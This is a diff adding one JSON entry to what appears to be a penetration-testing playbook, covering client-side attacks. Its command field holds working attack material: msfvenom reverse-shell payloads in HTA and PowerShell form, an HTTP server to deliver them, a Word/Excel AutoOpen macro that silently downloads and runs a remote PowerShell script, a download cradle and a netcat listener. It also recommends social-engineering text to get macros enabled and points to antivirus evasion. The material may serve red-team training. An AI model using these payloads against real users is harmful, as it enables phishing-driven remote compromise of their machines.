@@ -1,0 +1,18 @@
+{
+  "id": "client_side",
+  "phase": "SHELL",
+  "title": "Client-Side Attacks",
+  "body": "HTA, malicious Office macros, VBA. Used when you have a way to get a user to open a file or click a link. Set up listener first.",
+  "cmd": "# HTA via msfvenom\nmsfvenom -p windows/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f hta-psh -o shell.hta\npython3 -m http.server 80\n# Deliver: http://$lhost/shell.hta\n\n# VBA macro (Word/Excel)\n# Insert > Module in VBA editor:\nSub AutoOpen()\n  Shell \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\"\nEnd Sub\n\n# PowerShell download cradle\nIEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')\n\n# Generate PS reverse shell\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f ps1 > shell.ps1\n\nnc -nlvp $lport",
+  "warn": "Macro execution requires the user to enable macros. Social engineering text in the doc helps.",
+  "choices": [
+    {
+      "label": "User executed — got shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "AV killed the payload",
+      "next": "amsi_bypass"
+    }
+  ]
+}
